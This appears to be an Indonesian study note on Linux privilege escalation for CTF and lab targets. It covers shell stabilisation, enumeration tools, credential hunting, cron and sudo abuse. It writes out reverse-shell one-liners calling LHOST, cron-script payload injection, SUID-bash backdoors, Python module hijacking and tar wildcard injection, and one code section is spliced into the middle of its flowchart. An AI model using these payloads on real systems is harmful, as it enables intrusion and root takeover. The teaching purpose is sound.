---
id: "44"
title: "🐧 44 — Linux Privilege Escalation Workflow"
category: "5. Privilege Escalation"
categoryId: "privesc"
filename: "44_linux_privesc_workflow.md"
refs_out: ["06","14a","15","35","42","43","45","54","64"]
refs_in: ["04","06","07","13","14a","14c","14d","17","17a","17b","17c","19","23","24","25","26","32","42","43","46","47","48","49","54"]
---

	# 🐧 44 — Linux Privilege Escalation Workflow

> **Tujuan:** Menjadikan Linux Privilege Escalation sebagai proses sistematis, bukan kumpulan exploit acak.  
> **Target:** CTF / Hack The Box / TryHackMe / Proving Grounds / lab yang memang diizinkan.  
> **Asumsi:** Sudah memiliki **low-privilege shell** di target Linux.  
> **Prinsip utama:** **Enumerate → Identify → Validate → Exploit → Verify → Cleanup**

---

# 🧭 BAGIAN 0 — FONDASI LINUX PRIVESC

## 0.1 🧠 Mindset Linux PrivEsc

Linux Privilege Escalation bukan sekadar:

```bash
# Jalankan exploit random
./exploit
```

Cara berpikir yang lebih benar adalah:

```text
KITA SUDAH BERHASIL MASUK
        │
        ▼
SEKARANG CARI:
"Privilege apa yang sudah dimiliki?"
"Privilege apa yang bisa diwariskan?"
"Apa yang dipercaya sistem sebagai root?"
"Apa yang bisa kita kontrol?"
        │
        ▼
IDENTIFIKASI MISCONFIGURATION
        │
        ▼
VALIDASI
        │
        ▼
EKSPLOITASI
```

### 🏢 Analogi nyata

Bayangkan kita sudah berhasil masuk ke sebuah gedung.

Kita bukan sedang:

> "Mencoba semua pintu secara acak."

Kita justru bertanya:

```text
Saya sekarang ada di lantai berapa?
        │
        ├── Apakah ada tangga?
        ├── Apakah ada lift?
        ├── Apakah ada akses maintenance?
        ├── Apakah ada kartu akses?
        ├── Apakah ada pintu yang salah konfigurasi?
        └── Apakah ada staf yang meninggalkan kunci?
```

Dalam Linux:

```text
"Tangga"               = SUID / sudo / capabilities
"Kunci tertinggal"     = credentials
"Pintu salah konfigurasi" = cron / service / writable file
"Akses maintenance"    = Docker / LXD / NFS
"Lift"                 = kernel exploit
```

---

## 0.2 🧩 CTF PrivEsc vs Real Pentest

### CTF

Dalam CTF:

```text
Low privilege
   ↓
Cari misconfiguration
   ↓
Exploit
   ↓
Root
   ↓
Flag
```

Lingkungan biasanya:

- sengaja dibuat vulnerable
    
- exploitability tinggi
    
- downtime tidak terlalu penting
    
- payload agresif dapat digunakan
    
- snapshot/reset tersedia
    

### Real Pentest

Dalam engagement nyata:

```text
Low privilege
   ↓
Identify weakness
   ↓
Validate safely
   ↓
Assess impact
   ↓
Document evidence
```

Kita harus mempertimbangkan:

- downtime
    
- production availability
    
- data integrity
    
- persistence
    
- detection
    
- logging
    
- business impact
    
- rules of engagement
    

**Kesalahan pemula:**

> "Kalau exploit berhasil di HTB, berarti aman dijalankan di server produksi."

Tidak.

Exploit kernel misalnya dapat menyebabkan crash. Payload yang mengubah `/etc/passwd`, `/etc/sudoers`, atau service production juga dapat merusak sistem.

---

## 0.3 📊 Kenapa Enumeration adalah 90% PrivEsc?

Angka **90%** jangan dipahami sebagai angka statistik literal.

Maksudnya:

> Sebagian besar pekerjaan PrivEsc adalah menemukan kondisi yang membuat privilege escalation mungkin.

Contohnya:

```text
sudo -l
   ↓
NOPASSWD: /usr/bin/vim
   ↓
GTFOBins
   ↓
Shell root
```

Exploit-nya hanya satu langkah.

Pekerjaan penting justru:

```text
Menemukan sudo
        ↓
Memahami policy
        ↓
Mengecek binary
        ↓
Menentukan apakah controllable
        ↓
Menentukan metode exploitation
```

### Prinsip utama

```text
ENUMERATE FIRST.
EXPLOIT SECOND.
```

Jangan:

```text
searchsploit
   ↓
download exploit
   ↓
jalankan
   ↓
berharap root
```

Lakukan:

```text
Identify
   ↓
Understand
   ↓
Validate
   ↓
Exploit
```

---

# 0.4 🔀 Diagram Alur Linux PrivEsc

```text
[LOW PRIV SHELL DIDAPAT]
            │
            ▼
[FASE 1: STABILISASI SHELL]
            │
            ▼
[FASE 2: AUTOMATED ENUMERATION]
            │
            ▼
[FASE 3: MANUAL ENUMERATION]
            │
            ├── Sudo Misconfig?
            ├── SUID/SGID Abuse?
            ├── Capabilities?
            ├── Cron Jobs?
            ├── Writable Files?
            ├── Services Running as Root?
            ├── Kernel Exploit?
            ├── Credentials Found?
            ├── PATH Hijacking?
            ├── Library Hijacking?
            ├── NFS Misconfiguration?
            └── Docker/LXD Group?

## 📂 Services Running as Root

Enumerate services that are executed as root and look for writable binaries or configuration files.

```bash
# List processes owned by root
ps aux | awk '$1 == "root" {print $0}'

# Find systemd service files and inspect Exec* directives for writable paths
find /etc/systemd -name "*.service" -exec grep -E "ExecStart|ExecReload|ExecStop" {} + |
  while read -r line; do
    service=$(echo "$line" | cut -d: -f1)
    exec_path=$(echo "$line" | grep -oE "(/[^ ]+)+")
    if [ -w "$exec_path" ]; then
      echo "[WRITABLE] $service -> $exec_path"
    else
      echo "[OK] $service -> $exec_path"
    fi
  done
```
                    │
                    ▼
             [VALIDASI VECTOR]
                    │
                    ▼
             [EKSPLOITASI VECTOR]
                    │
                    ▼
             [VERIFY PRIVILEGE]
                    │
                    ▼
             [ROOT SHELL / FLAG]
```

---

# 0.5 🖥️ FASE 1 — Stabilisasi Shell

Shell yang diperoleh dari exploit atau reverse shell belum tentu nyaman digunakan.

Shell sederhana sering memiliki masalah:

```text
❌ Tidak ada TAB completion
❌ Ctrl+C dapat membunuh shell
❌ Full-screen application rusak
❌ sudo meminta TTY
❌ Editor seperti vim tidak bekerja normal
❌ Ukuran terminal tidak diketahui
```

---

## 🐍 Method 1 — Python3

```bash
# Jalankan Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Contoh:

```text
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@victim:/var/www/html$
```

---

## 🐍 Method 2 — Python2

```bash
# Gunakan jika Python3 tidak tersedia
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 📜 Method 3 — script

```bash
# Buat pseudo terminal menggunakan utilitas script
script /dev/null -c bash
```

---

## 💎 Method 4 — Perl

```bash
# Spawn bash melalui Perl
perl -e 'exec "/bin/bash";'
```

---

## 💎 Method 5 — Ruby

```bash
# Spawn bash melalui Ruby
ruby -e 'exec "/bin/bash"'
```

---

## ⌨️ Upgrade terminal lokal

Setelah PTY berhasil:

```text
Ctrl + Z
```

Pada terminal attacker:

```bash
# Ubah terminal lokal ke raw mode
stty raw -echo; fg
```

Tekan:

```text
Enter
```

Kemudian di shell target:

```bash
# Set terminal
export TERM=xterm-256color

# Set ukuran terminal
stty rows 38 columns 116
```

Ukuran yang benar dapat diperoleh di terminal attacker:

```bash
# Tampilkan rows dan columns
stty size
```

Contoh:

```text
38 116
```

Maka:

```bash
stty rows 38 columns 116
```

### ✅ Test

```bash
# Test terminal
clear

# Test keyboard
id

# Test interactive application
sudo -l
```

---

# 0.6 📦 Transfer Tools ke Target

Pada CTF, target sering tidak memiliki internet.

Karena itu attacker machine sebaiknya menjalankan HTTP server lokal.

## HTTP Server

Di attacker:

```bash
# Masuk ke direktori tools
cd /opt/tools

# Jalankan HTTP server
python3 -m http.server 8080
```

Contoh:

```text
Serving HTTP on 0.0.0.0 port 8080
```

Target:

```bash
# Download menggunakan wget
wget http://$LHOST:8080/linpeas.sh -O /tmp/linpeas.sh
```

Atau:

```bash
# Download menggunakan curl
curl http://$LHOST:8080/linpeas.sh -o /tmp/linpeas.sh
```

Kemudian:

```bash
# Jadikan executable
chmod +x /tmp/linpeas.sh
```

---

## 📡 Alternatif `/dev/tcp`

Bash memiliki `/dev/tcp` pada banyak sistem Bash.

```bash
# Buka koneksi TCP ke attacker
exec 3<>/dev/tcp/$LHOST/8080

# Kirim HTTP request
printf 'GET /linpeas.sh HTTP/1.0\r\nHost: %s\r\n\r\n' "$LHOST" > &3

# Simpan respons
cat <&3 > /tmp/linpeas.raw
```

**Alternative reverse shells**
- **Python**:
  ```bash
  python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("LHOST",LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
  ```
- **Netcat without `-e`**:
  ```bash
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
  ```
- **Perl**:
  ```bash
  perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
  ```


**Catatan penting:**

HTTP response akan mengandung header.

Metode ini hanya cocok sebagai fallback dan membutuhkan parsing jika file harus dipulihkan secara bersih. `wget` atau `curl` jauh lebih praktis.

---

## 🔌 Alternatif Netcat

Attacker:

```bash
# Kirim file melalui TCP
nc -lvnp 4444 < linpeas.sh
```

Target:

```bash
# Terima file
nc $LHOST 4444 > /tmp/linpeas.sh
```

Kemudian:

```bash
# Jadikan executable
chmod +x /tmp/linpeas.sh
```

---

# 🤖 BAGIAN 1 — AUTOMATED ENUMERATION

> Automated tools mempercepat discovery.  
> Mereka **bukan pengganti pemahaman manual**.

---

# 1.1 🟥 LinPEAS

## Apa itu LinPEAS?

LinPEAS adalah tool otomatis untuk enumerasi Linux PrivEsc.

Ia membantu mencari:

```text
Sudo
SUID
Capabilities
Cron
Processes
Services
Credentials
Writable files
Network
Containers
Kernel information
```

Urutan praktis:

```text
Shell
 ↓
Stabilize
 ↓
LinPEAS
 ↓
Read output
 ↓
Manual verification
```

---

## Download

Attacker:

```bash
# Download LinPEAS dari repository PEASS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Transfer:

```bash
# Jalankan HTTP server
python3 -m http.server 8080
```

Target:

```bash
# Download ke /tmp
wget http://$LHOST:8080/linpeas.sh -O /tmp/linpeas.sh

# Jadikan executable
chmod +x /tmp/linpeas.sh
```

---

## Run standar

```bash
# Jalankan LinPEAS
/tmp/linpeas.sh
```

---

## Simpan output

```bash
# Simpan sambil tetap melihat output
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

---

## Tanpa warna

```bash
# -n membantu pada terminal yang tidak mendukung color output
/tmp/linpeas.sh -n | tee /tmp/linpeas_output.txt
```

---

## Scan cepat

```bash
# -s = skip checks yang memakan waktu
/tmp/linpeas.sh -s
```

---

## Dengan timeout

```bash
# Batasi runtime menjadi 300 detik
timeout 300 /tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

---

# 1.1.1 🎨 Membaca Output LinPEAS

LinPEAS memakai warna dan indikator untuk membantu prioritas.

Namun:

> **Warna bukan bukti exploitability.**

Jangan mengasumsikan:

```text
RED = pasti root
```

Yang benar:

```text
RED
 ↓
Interesting
 ↓
Investigate
 ↓
Validate
 ↓
Exploitability?
```

### Prioritas praktis

```text
🔴 RED / HIGH PRIORITY
→ Investigate segera

🟠 ORANGE / INTERESTING
→ Investigate

🟡 YELLOW
→ Catat dan korelasikan

🟢 GREEN
→ Biasanya bukan prioritas
```

---

## Grep informasi penting

```bash
# Cari indikator privilege escalation
grep -Ei "99%|95%|interesting|possible privesc" \
  /tmp/linpeas_output.txt
```

Sudo:

```bash
# Cari section sudo
grep -i -A10 -B3 "sudo" /tmp/linpeas_output.txt
```

SUID:

```bash
# Cari SUID
grep -i -A20 -B3 "suid" /tmp/linpeas_output.txt
```

Cron:

```bash
# Cari cron
grep -i -A20 -B3 "cron" /tmp/linpeas_output.txt
```

Credential:

```bash
# Cari indikasi credential
grep -iE "password|passwd|pwd|secret|token|apikey|key" \
  /tmp/linpeas_output.txt
```

### Mindset membaca LinPEAS

Jangan:

```text
LinPEAS menemukan python SUID
→ langsung exploit
```

Lakukan:

```text
LinPEAS menemukan python SUID
        ↓
ls -la /usr/bin/python*
        ↓
getcap?
        ↓
SUID benar?
        ↓
Versi?
        ↓
GTFOBins?
        ↓
Eksploitasi
```

---

# 1.2 🟦 Linux Smart Enumeration — LSE

LSE adalah alternatif LinPEAS.

Download:

```bash
# Download LSE
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh \
  -O /tmp/lse.sh

# Jadikan executable
chmod +x /tmp/lse.sh
```

Level 0:

```bash
# Quick scan
/tmp/lse.sh -l 0
```

Level 1:

```bash
# Standard scan
/tmp/lse.sh -l 1
```

Level 2:

```bash
# Detailed scan
/tmp/lse.sh -l 2
```

Simpan:

```bash
# Simpan output
/tmp/lse.sh -l 1 -i | tee /tmp/lse_output.txt
```

---

# 1.3 🟦 LinEnum

```bash
# Jadikan executable
chmod +x /tmp/LinEnum.sh

# Thorough mode
/tmp/LinEnum.sh -t | tee /tmp/linenum_output.txt
```

Gunakan LinEnum sebagai:

```text
Second opinion
```

bukan sebagai:

```text
Satu-satunya sumber kebenaran
```

---

# 1.4 👁️ pspy — Process Monitor

`pspy` sangat penting karena masalah terbesar pada cron/service terkadang bukan:

```text
"Apa isi config?"
```

melainkan:

```text
"Apa yang benar-benar dieksekusi sistem?"
```

pspy dapat mengamati process execution tanpa membutuhkan root.

---

## Cek architecture

```bash
# Cek architecture
uname -m
```

Contoh:

```text
x86_64
```

atau:

```text
i686
```

---

## Download

Untuk x86_64:

```bash
# Download pspy64
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 \
  -O /tmp/pspy64

# Jadikan executable
chmod +x /tmp/pspy64
```

---

## Jalankan

```bash
# Jalankan pspy
/tmp/pspy64
```

Amati beberapa menit.

---

## Filter UID root

```bash
# Tampilkan process yang dijalankan UID 0
/tmp/pspy64 | grep "UID=0"
```

---

## Print command + interval

```bash
# -p = print command
# -i = interval
/tmp/pspy64 -p -i 1000
```

---

# 1.4.1 🔍 Cara Membaca Output pspy

Contoh:

```text
2024/01/15 10:30:01 CMD: UID=0 PID=1234 | /bin/sh -c /opt/cleanup.sh
2024/01/15 10:30:01 CMD: UID=0 PID=1235 | /bin/bash /opt/cleanup.sh
2024/01/15 10:31:01 CMD: UID=0 PID=1236 | /bin/sh -c /opt/cleanup.sh
```

Analisis:

```text
UID=0
↓
Process dijalankan sebagai root

PID=1234
↓
Process ID

/opt/cleanup.sh
↓
Script yang dieksekusi
```

Kemudian:

```bash
# Cek ownership
ls -la /opt/cleanup.sh

# Cek permission numerik
stat -c "%A %a %U:%G %n" /opt/cleanup.sh
```

Misalnya:

```text
-rwxrwxrwx 777 root root /opt/cleanup.sh
```

Berarti:

```text
root mengeksekusi script
+
kita dapat write
=
potensi PrivEsc
```

Tetap lakukan validasi sebelum modifikasi.

---

# 🔎 BAGIAN 2 — MANUAL ENUMERATION SISTEMATIK

LinPEAS bisa menemukan banyak hal.

Tetapi manual enumeration dibutuhkan karena:

```text
Automated Tool
      ↓
Candidate Finding
      ↓
Manual Verification
      ↓
Context
      ↓
Exploit
```

---

# 2.1 🖥️ System Information

```bash
# Kernel + hostname + architecture
uname -a

# Versi kernel saja
uname -r

# Distro + versi
cat /etc/os-release

# Informasi login / distro
cat /etc/issue

# Informasi kernel
cat /proc/version

# Architecture
arch
uname -m

# Environment variables
env
printenv

# PATH
echo "$PATH"
```

---

## Membaca `uname -a`

Contoh:

```text
Linux victim 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux
```

Interpretasi:

```text
Linux
│
├── hostname = victim
│
├── kernel = 5.4.0-42-generic
│
├── distro clue = Ubuntu
│
└── architecture = x86_64
```

### Jangan melakukan kesalahan ini

```text
Kernel 5.4
↓
Cari exploit "Linux 5.4"
↓
Compile
```

Kernel version saja tidak cukup.

Perlu:

```text
Kernel version
+
Distribution
+
Distribution release
+
Architecture
+
Patch level
```

---

# 2.2 👤 User & Group Enumeration

```bash
# Current identity
id

# Current username
whoami

# Groups
groups
```

Contoh:

```text
uid=1000/alice gid=1000/alice groups=1000/alice,4/adm,998/docker
```

Perhatikan:

```text
docker
lxd
disk
adm
sudo
```

Namun jangan menyimpulkan otomatis:

```text
group = root
```

Makna setiap group harus divalidasi berdasarkan capability group tersebut.

---

## Semua user

```bash
# Tampilkan user, UID, home, shell
cat /etc/passwd | \
  grep -vE '(/usr/sbin/nologin|/bin/false)' | \
  cut -d: -f1,3,6,7
```

---

## `/etc/passwd`

```bash
# Lihat permission
ls -la /etc/passwd

# Lihat metadata
stat /etc/passwd
```

Secara normal:

```text
-rw-r--r-- root root /etc/passwd
```

Writable `/etc/passwd` adalah kondisi serius, tetapi metode eksploitasi harus mempertimbangkan konfigurasi sistem modern dan policy tambahan.

---

## Semua group

```bash
# Tampilkan group
cat /etc/group
```

---

## User aktif

```bash
# User yang sedang login
w

# User login
who

# Login history
last | head -20
```

---

## Sudo

```bash
# WAJIB selalu cek
sudo -l
```

Jika memerlukan password:

```text
[sudo] password for alice:
```

Jangan langsung menganggap sudo gagal.

Cek juga:

```text
# Apakah shell memiliki TTY?
tty

# Identity
id
```

---

## Sudoers

```bash
# Baca sudoers jika permission memungkinkan
cat /etc/sudoers 2>/dev/null

# Baca drop-in
cat /etc/sudoers.d/* 2>/dev/null
```

---

# 2.2.1 🔥 Analisis `sudo -l`

### Scenario 1 — Full sudo

```text
User alice may run the following commands:
    (ALL : ALL) NOPASSWD: ALL
```

Arti:

```text
alice
 ↓
boleh menjalankan command apa pun
 ↓
sebagai root
```

Validasi:

```bash
# Jalankan root shell
sudo /bin/bash

# Verifikasi
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

### Scenario 2 — Vim

```text
(root) NOPASSWD: /usr/bin/vim
```

Konsep:

```text
Allowed binary
+
Privilege escalation escape
=
root
```

GTFOBins:

```bash
# Jalankan vim dengan sudo
sudo /usr/bin/vim
```

Di dalam Vim:

```text
:!/bin/bash
```

Kemudian:

```bash
# Verifikasi
id
```

---

### Scenario 3 — Script writable

```text
(root) NOPASSWD: /opt/scripts/backup.sh
```

Pertanyaan yang benar:

```text
Apakah backup.sh writable?
```

Cek:

```bash
# Ownership
ls -la /opt/scripts/backup.sh

# Detail permission
stat /opt/scripts/backup.sh

# Lihat isi script
sed -n '1,200p' /opt/scripts/backup.sh
```

---

### Scenario 4 — Wildcard

Misalnya:

```text
(root) NOPASSWD: /usr/bin/tar -czf /backup/archive.tar.gz *
```

Jangan menganggap semua `*` otomatis exploitable.

Harus dianalisis:

```text
Bagaimana shell melakukan expansion?
Command apa yang dipanggil?
Apakah tar menerima argument tersebut?
Apakah attacker mengontrol working directory?
Apakah argument dapat dianggap option?
```

Contoh tar wildcard injection secara konsep:

```bash
# Masuk ke direktori yang diproses tar
cd /backup/data

# Buat filename yang menyerupai option
touch -- '--checkpoint=1'

# Contoh checkpoint action
touch -- '--checkpoint-action=exec=sh payload.sh'
```

Exploitability bergantung pada **command sebenarnya**, working directory, quoting, dan implementasi command.

---

# 2.3 🌐 Network Information

```bash
# Interface
ip a

# Fallback
ifconfig 2>/dev/null
```

---

## Routing

```bash
# Routing table
ip route

# Legacy
route -n 2>/dev/null
```

Contoh:

```text
default via 10.10.10.1 dev eth0
10.10.10.0/24 dev eth0
10.10.20.0/24 via 10.10.10.1
```

Temuan seperti:

```text
10.10.20.0/24
```

dapat menunjukkan internal network.

---

## Listening services

```bash
# TCP/UDP listening sockets
ss -tulpn
```

Legacy:

```bash
netstat -tulpn 2>/dev/null
```

Perhatikan:

```text
127.0.0.1:8080
127.0.0.1:3306
127.0.0.1:6379
```

Kenapa menarik?

Karena:

```text
localhost-only service
        ↓
tidak exposed externally
        ↓
tetapi accessible dari shell lokal
```

Contoh:

```bash
# Test web service internal
curl http://127.0.0.1:8080/

# Test MySQL
mysql -h 127.0.0.1 -u root
```

---

## Neighbor / ARP

```bash
# Neighbor table
ip neigh

# Legacy
arp -a 2>/dev/null
```

---

## Hosts

```bash
# Static hostname mappings
cat /etc/hosts
```

---

## DNS

```bash
# DNS resolver
cat /etc/resolv.conf
```

---

# 2.4 📂 File System Enumeration

## Mount

```bash
# Mounted filesystems
mount

# Kernel mount information
cat /proc/mounts

# Disk usage
df -h
```

---

## SUID

```bash
# Cari SUID
find / -perm -4000 -type f 2>/dev/null
```

Alternatif:

```bash
# Bentuk lain
find / -perm -u=s -type f 2>/dev/null
```

---

## SGID

```bash
# Cari SGID
find / -perm -2000 -type f 2>/dev/null
```

---

## World-writable files

```bash
# File writable oleh others
find / -type f -perm -o+w 2>/dev/null | grep -v '/proc/'
```

---

## World-writable directories

```bash
# Directory writable oleh others
find / -type d -perm -o+w 2>/dev/null | \
  grep -vE '^/(proc|sys|dev)'
```

---

## Files owned by current user

```bash
# Cari file yang kita miliki
find / -user "$(whoami)" -type f 2>/dev/null | \
  grep -vE '^/(proc|sys|dev)'
```

---

## Recently modified

```bash
# Modified dalam 60 menit
find / -type f -mmin -60 2>/dev/null | \
  grep -vE '^/(proc|sys|dev)'

# Modified dalam 24 jam
find / -type f -mtime -1 2>/dev/null | \
  grep -vE '^/(proc|sys|dev)'
```

---

## File besar

```bash
# File > 50 MB
find / -type f -size +50M 2>/dev/null | \
  grep -vE '^/(proc|sys|dev)'
```

---

## Backup files

```bash
# Cari backup
find / \
  \( -name "*.bak" \
  -o -name "*.backup" \
  -o -name "*.old" \
  -o -name "*.orig" \
  -o -name "*.copy" \) \
  2>/dev/null
```

---

# 2.5 🔐 Credential Discovery

Credential discovery sering lebih efektif daripada kernel exploit.

Workflow:

```text
Credential
   ↓
Reuse
   ↓
User switch
   ↓
SSH
   ↓
Sudo
   ↓
Root
```

---

## History

```bash
# Bash history
cat ~/.bash_history 2>/dev/null

# Zsh history
cat ~/.zsh_history 2>/dev/null

# SH history
cat ~/.sh_history 2>/dev/null
```

Semua home:

```bash
# Cari history file
find /home -type f \
  \( -name ".bash_history" -o -name ".zsh_history" \) \
  2>/dev/null
```

---

## SSH Keys

```bash
# Private RSA keys
find / -name "id_rsa" 2>/dev/null

# Ed25519
find / -name "id_ed25519" 2>/dev/null

# PEM
find / -name "*.pem" 2>/dev/null

# SSH directory
find /home -type d -name ".ssh" 2>/dev/null

# Authorized keys
find / -name "authorized_keys" 2>/dev/null
```

Jika menemukan private key:

```bash
# Cek permission
ls -la /path/to/id_rsa

# Tes apakah key valid
ssh-keygen -y -f /path/to/id_rsa >/dev/null
```

---

## Config files

```bash
# Cari config dengan credential-related string
find / \
  \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" \) \
  -type f 2>/dev/null | \
  xargs grep -IlE "password|passwd|secret|token" 2>/dev/null
```

---

## Web configuration

```bash
# Cari .env
find / -name ".env" -type f 2>/dev/null

# Cari wp-config
find / -name "wp-config.php" -type f 2>/dev/null

# Cari config.php
find / -name "config.php" -type f 2>/dev/null

# Cari database.yml
find / -name "database.yml" -type f 2>/dev/null
```

Contoh:

```bash
# WordPress config
cat /var/www/html/wp-config.php 2>/dev/null

# Generic PHP config
cat /var/www/html/config.php 2>/dev/null
```

---

## Grep web credentials

```bash
# Cari password-related strings
grep -RniE "password|passwd|db_pass|database_password" \
  /var/www/ 2>/dev/null | \
  grep -v "/.git/"
```

---

## Environment credentials

```bash
# Cari credential dalam environment
env | grep -iE "pass|pwd|secret|token|key"
```

Jangan mengandalkan `/proc/*/environ` secara universal karena permission dapat membatasi akses.

Coba proses tertentu:

```bash
# Lihat environment process sendiri
tr '\0' '\n' < /proc/self/environ
```

Jika proses target dapat dibaca:

```bash
# Contoh membaca environment proses
tr '\0' '\n' < /proc/$PID/environ 2>/dev/null
```

---

## `.netrc`

```bash
# Credential automation
cat ~/.netrc 2>/dev/null

# Cari semua
find / -name ".netrc" 2>/dev/null
```

---

## Git repositories

```bash
# Cari git repository
find / -type d -name ".git" 2>/dev/null
```

Masuk:

```bash
# Masuk ke repository
cd /path/to/repository

# History
git log --oneline

# Commit terakhir
git show HEAD
```

Cari secrets historis:

```bash
# Cari password/token di seluruh history
git log -p --all | \
  grep -iE "password|secret|token|api[_-]?key"
```

---

# 2.6 ⏰ Cron Jobs

## User crontab

```bash
# Current user cron
crontab -l 2>/dev/null
```

Root:

```bash
# Coba root cron
crontab -l -u root 2>/dev/null
```

Semua user:

```bash
# Enumerate user crontabs
while IFS=: read -r user _; do
    echo "===== $user ====="
    crontab -l -u "$user" 2>/dev/null
done < /etc/passwd
```

---

## System cron

```bash
# Main cron
cat /etc/crontab

# Cron directories
ls -la /etc/cron*
```

```bash
# Cron jobs
cat /etc/cron.d/* 2>/dev/null
cat /etc/cron.daily/* 2>/dev/null
cat /etc/cron.hourly/* 2>/dev/null
cat /etc/cron.weekly/* 2>/dev/null
cat /etc/cron.monthly/* 2>/dev/null
```

---

## Systemd timers

```bash
# List timers
systemctl list-timers --all 2>/dev/null
```

Cari file:

```bash
# Timer definitions
find /etc/systemd/system -name "*.timer" -o -name "*.service" \
  2>/dev/null
```

---

## pspy correlation

```bash
# Jalankan process monitor
/tmp/pspy64 -p
```

Cari:

```text
UID=0
```

---

# 2.6.1 💥 Cron Exploitation

Misalnya:

```text
root → /opt/cleanup.sh
```

dan:

```bash
ls -la /opt/cleanup.sh
```

Output:

```text
-rwxrwxrwx 1 root root 412 Jan 15 10:00 /opt/cleanup.sh
```

Berarti:

```text
Owner = root
Cron = root
Writable = yes
```

Potensi:

```text
root executes attacker-controlled code
```

---

## Backup dahulu

```bash
# Backup script jika diperbolehkan dalam lab
cp /opt/cleanup.sh /tmp/cleanup.sh.bak
```

---

## Reverse shell

Attacker:

```bash
# Listener
nc -lvnp $LPORT
```

Target:

```bash
# Tambahkan payload pada script
printf '\nbash -i >& /dev/tcp/%s/%s 0>&1\n' \
  "$LHOST" "$LPORT" >> /opt/cleanup.sh
```

Kemudian tunggu cron.

---

## SUID payload

```bash
# Buat SUID bash ketika script berjalan sebagai root
printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' \
  >> /opt/cleanup.sh
```

Kemudian:

```bash
# Setelah cron mengeksekusi
/tmp/rootbash -p
```

Verifikasi:

```bash
# Cek identity
id
```

---

# 2.6.2 📦 Writable Imported Script

Contoh:

```text
root cron
   ↓
/opt/backup.py
   ↓
import utils
```

dan:

```text
/usr/local/lib/utils.py
```

dapat ditulis user.

Konsep:

```text
Trusted root script
        ↓
imports attacker-controlled file
        ↓
attacker code executes as root
```

Contoh payload lab:

```bash
# Backup utility asli bila diperbolehkan
cp /usr/local/lib/utils.py /tmp/utils.py.bak

# Buat module sederhana
cat > /usr/local/lib/utils.py << 'PY'
import os
os.system("cp /bin/bash /tmp/rootbash")
os.system("chmod 4755 /tmp/rootbash")
PY
```

Kemudian:

```bash
# Tunggu task berjalan
ls -la /tmp/rootbash

# Jalankan jika SUID sudah terpasang
/tmp/rootbash -p
```

---

# 2.6.3 🛣️ Cron PATH Injection

Contoh:

```text
PATH=/home/alice:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root backup.sh
```

Pertanyaan:

```text
Apakah backup.sh dipanggil dengan absolute path?
```

Jika tidak:

```text
backup.sh
```

dan directory yang diprioritaskan dapat dikontrol attacker:

```text
/home/alice
```

maka mungkin:

```bash
# Buat script palsu
cat > /home/alice/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

# Jadikan executable
chmod +x /home/alice/backup.sh
```

Tunggu cron:

```bash
# Cek apakah rootbash muncul
ls -la /tmp/rootbash
```

---

# 2.6.4 🎯 Cron Wildcard Injection

Contoh:

```text
* * * * * root tar czf /backup/backup.tar.gz /var/www/html/*
```

Masalah potensial:

```text
shell wildcard expansion
        ↓
filename menjadi argument
        ↓
argument dapat terlihat sebagai option
```

Konsep umum:

```bash
# Masuk ke directory target
cd /var/www/html

# Filename yang terlihat sebagai tar option
touch -- '--checkpoint=1'

# Filename kedua menjadi argument tar
touch -- '--checkpoint-action=exec=...'
```

**Jangan menghafal command ini secara buta.**

Pertama lihat:

```bash
# Tulis ulang command persis seperti cron
cat /etc/crontab

# Cari working directory
grep -R "tar" /etc/cron* /etc/systemd 2>/dev/null
```

---

# 2.7 ⚙️ Running Services & Processes

## Process enumeration

```bash
# Semua process
ps aux

# Process root
ps aux | grep '^root'

# Full command line
ps auxwww
```

---

## Services

```bash
# Running services
systemctl list-units \
  --type=service \
  --state=running 2>/dev/null
```

Legacy:

```bash
# Service status
service --status-all 2>/dev/null
```

---

## Version

```bash
# Nginx version
nginx -v 2>&1

# Apache version
apache2 -v 2>&1

# MySQL
mysql --version 2>/dev/null

# PHP
php --version 2>/dev/null
```

---

## Localhost services

```bash
# Cari service localhost
ss -lntup | grep '127.0.0.1'
```

Contoh:

```text
LISTEN 0 128 127.0.0.1:8080
```

Investigate:

```bash
# HTTP
curl -i http://127.0.0.1:8080/
```

---

# 2.8 📦 Installed Software

## Debian/Ubuntu/Parrot

```bash
# Installed packages
dpkg -l 2>/dev/null

# Nama dan versi
dpkg-query -W -f='${binary:Package} ${Version}\n' 2>/dev/null
```

## RPM based

```bash
# RedHat/CentOS/Fedora
rpm -qa 2>/dev/null
```

---

## Interesting runtimes

```bash
# Python
python3 --version 2>/dev/null

# PHP
php --version 2>/dev/null

# Ruby
ruby --version 2>/dev/null

# Perl
perl --version 2>/dev/null

# Node
node --version 2>/dev/null
```

---

## Custom binaries

```bash
# /opt
ls -la /opt/

# Local binaries
ls -la /usr/local/bin/

# User binaries
ls -la /home/*/bin/ 2>/dev/null
```

---

# 🛡️ BAGIAN 3 — SUDO MISCONFIGURATION

# 3.1 🧠 Konsep sudo

`sudo` memungkinkan user menjalankan program berdasarkan policy sudoers.

Contoh:

```text
alice ALL=(root) NOPASSWD: /usr/bin/vim
```

Interpretasi:

```text
alice
 ↓
allowed to run
 ↓
/usr/bin/vim
 ↓
as root
 ↓
without password
```

---

